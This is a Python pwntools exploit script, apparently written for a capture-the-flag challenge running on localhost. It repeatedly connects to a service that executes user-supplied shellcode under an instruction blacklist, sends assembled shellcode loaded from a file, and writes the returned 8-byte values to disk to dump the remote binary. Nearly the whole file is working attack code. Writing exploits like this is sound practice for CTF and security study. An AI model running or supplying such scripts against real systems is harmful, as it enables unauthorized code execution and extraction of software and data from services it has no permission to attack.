#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chal --host 127.0.0.1 --port 8080
from pwn import *
import tty

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chal') # for local debuging purposes

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

#io = start()

# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)


def send_shellcode(shellcode):
    io.recvuntil("Please enter lenght of shellcode without ret,jmp,push,int,call and pop\n")
    io.sendline("%d"%len(shellcode))
    io.recvuntil("Enter shellcode:/>")
    io.send(shellcode)



def generate_shellcode(shellcode_file,arguments=""):

    with open(shellcode_file,"r") as shell:
        code = shell.read()
        if arguments != "":
            code = (code % arguments)
            code = code.strip()
        return asm(code, arch = 'amd64')



log.info("Opening Extracted_elf")
    
with open("Extracted_elf","wb") as extract:
    curs = 0 

    p = log.progress("Leaking binary")
    try:
        while True:# We will read until the programs seg faults causing us to get an Eof exception
            io = start()
            for x in range(0,3):

                send_shellcode(generate_shellcode("leak_elf.s",arguments=curs))
                io.recvuntil("Return value = ")

                instruction = io.recvline().strip()
                if instruction == b'(nil)':
                    instruction="0x0"
                instruction = p64(int(instruction,16))
                extract.write(instruction)
                p.status("Leaked %d of ?" % (curs*8))
                curs += 1 
            io.close()
    except Exception as e:
        print(e)
    p.success(" Sucessfully Leaked %d of ?" % curs)

log.info("Done")


